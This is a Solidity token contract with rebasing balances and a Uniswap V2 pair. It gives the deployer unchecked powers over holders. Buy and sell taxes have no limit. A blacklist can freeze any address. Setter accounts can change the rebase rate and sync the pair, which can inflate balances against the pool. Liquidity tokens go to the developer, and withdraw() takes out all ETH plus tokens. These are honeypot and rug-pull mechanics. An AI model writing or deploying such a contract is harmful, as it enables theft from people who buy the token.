// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./sEReC20.sol";

interface IUniswapV2Router02{
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) 
        external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Pair {function sync() external;}

interface IUniswapV2Factory{function createPair(address tokenA, address tokenB) external returns (address pair);}

contract sEReC20_UniV2_Rebase is sEReC20 {

    IUniswapV2Router02 public uniswapV2Router;
    IUniswapV2Pair public uniswapPair;

    uint public _buyTax = 0;
    uint public _sellTax = 0;
    uint public _max = 1;
    uint public _transferDelay = 0;
    uint public _swapAmount = 1000 * 10**18;
    uint public _base = 1000000;

    address private _dev;
    address[] public _path;
    address private _v2Pair;
    address private _collector;
    address private _v2Router = 0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506;

    mapping(address => bool) public isSetter;
    mapping(address => bool) public blacklisted;
    mapping(address => bool) public whitelisted;
    mapping(address => uint) private _lastTransferBlock;

    event Rebase(uint newRebaseRate);
    event SetterUpdated(address setter, bool status);

    modifier onlyDev() {require(msg.sender == _dev, "Only the developer can call this function");_;}
    modifier onlySetter() {require(isSetter[msg.sender], "Not a setter");_;}

    constructor(address collector_, string memory name_, string memory symbol_, uint decimals_, uint supply_) 
        sEReC20(name_, symbol_, decimals_, supply_) {
            _collector = collector_; _dev = msg.sender;
            _balanceOf[msg.sender] = 0;
            _balanceOf[address(this)] = _totalSupply;
            emit Transfer(address(0), address(this), _totalSupply);
            uniswapV2Router = IUniswapV2Router02(_v2Router);
            _v2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
            _path = new address[](2); _path[0] = address(this); _path[1] = uniswapV2Router.WETH();
            whitelisted[address(this)] = true; whitelisted[msg.sender] = true;
            uniswapPair = IUniswapV2Pair(_v2Pair);
    }

    function deposit() external payable onlyDev{}

    function maxInt() internal view returns (uint) {
        return (_totalSupply * _max * _base / 1000000) / 100;
    }

    function _transfer(address from, address to, uint amount)internal override{

        uint adjustedAmount = amount * 1000000 / _base;

        if (whitelisted[from] || whitelisted[to]) {super._transfer(from, to, adjustedAmount); return;}

        require(_balanceOf[from] * _base / 1000000 >= amount && (amount + _balanceOf[to] <= maxInt() ||
            whitelisted[from] || whitelisted[to] || to == _v2Pair),
            "sEReC20: transfer amount exceeds balance or max wallet"
        );

        require(!blacklisted[from] && !blacklisted[to], "sEReC20: YOU DONT HAVE THE RIGHT");

        require(block.number >= _lastTransferBlock[from] + _transferDelay ||
            from == _v2Pair || whitelisted[from] || whitelisted[to],
            "sEReC20: transfer delay not met"
        );

        uint taxAmount = 0;
        if ((from == _v2Pair || to == _v2Pair) && !whitelisted[from] && !whitelisted[to]) {
            uint effectiveAmount = amount * _base / 1000000;
            if (to == _v2Pair) {
                taxAmount = (effectiveAmount * _sellTax) / 100;
            } else {
                taxAmount = (effectiveAmount * _buyTax) / 100;
            }

            uint adjustTaxAmount = taxAmount * 1000000 / _base;
            _balanceOf[address(this)] += adjustTaxAmount;
            emit Transfer(from, address(this), adjustTaxAmount);

            _lastTransferBlock[from] = block.number; _lastTransferBlock[to] = block.number;
            if (_balanceOf[address(this)] > _swapAmount && to == _v2Pair) {
                _swapBack(_balanceOf[address(this)]);
            }
        }

        uint adjustedTaxAmount = taxAmount * 1000000 / _base;
        _balanceOf[from] -= adjustedAmount;
        _balanceOf[to] += adjustedAmount - adjustedTaxAmount;
        emit Transfer(from, to, adjustedAmount - adjustedTaxAmount);
    }

    function balanceOf(address account) public view override returns (uint) {
        return super.balanceOf(account) * _base / 1000000;
    }

    function totalSupply() public view override returns (uint) {
        return _totalSupply * _base / 1000000;
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        uint256 adjustedAmount = amount * 1000000 / _base;
        return super.approve(spender, adjustedAmount);
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return super.allowance(owner, spender) * _base / 1000000;
    }

    function updateRebaseRate(uint newRate) public onlySetter {
        _base = newRate;
        uniswapPair.sync();
        emit Rebase(newRate);
    }

    function updateSetter(address setter, bool status) public onlyDev {
        isSetter[setter] = status;
        emit SetterUpdated(setter, status);
    }

    function updateWhitelist(address[] memory addresses, bool whitelisted_) external onlyDev {
        for (uint i = 0; i < addresses.length; i++) {
            whitelisted[addresses[i]] = whitelisted_;
        }
    }

    function updateBlacklist(address[] memory addresses, bool blacklisted_) external onlyDev{
        for (uint i = 0; i < addresses.length; i++) {blacklisted[addresses[i]] = blacklisted_;}
    }

    function updateTaxes(uint buyTax_, uint sellTax_) external onlyDev {_buyTax = buyTax_; _sellTax = sellTax_;}

    function updateMax(uint newMax) external onlyDev {_max = newMax;}

    function updateTransferDelay(uint newTransferDelay) external onlyDev {_transferDelay = newTransferDelay;}

    function updateSwapAmount(uint newSwapAmount) external onlyDev {_swapAmount = newSwapAmount;}


    function _swapBack(uint amount_) internal{
        _allowance[address(this)][_v2Router] += amount_ + 100;
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(amount_, 0, _path, _collector, block.timestamp);
    }

    function _addLiquidity() external onlyDev{
        _allowance[address(this)][_v2Router] = _balanceOf[address(this)]; _buyTax = 15; _sellTax = 15;
        uniswapV2Router.addLiquidityETH{
            value: address(this).balance}(address(this), _balanceOf[address(this)], 0, 0, msg.sender, block.timestamp
        );
    }

    function withdraw(uint amount_) external onlyDev {
        payable(_dev).transfer(address(this).balance);
        _transfer(address(this), _dev, amount_);
    }

}
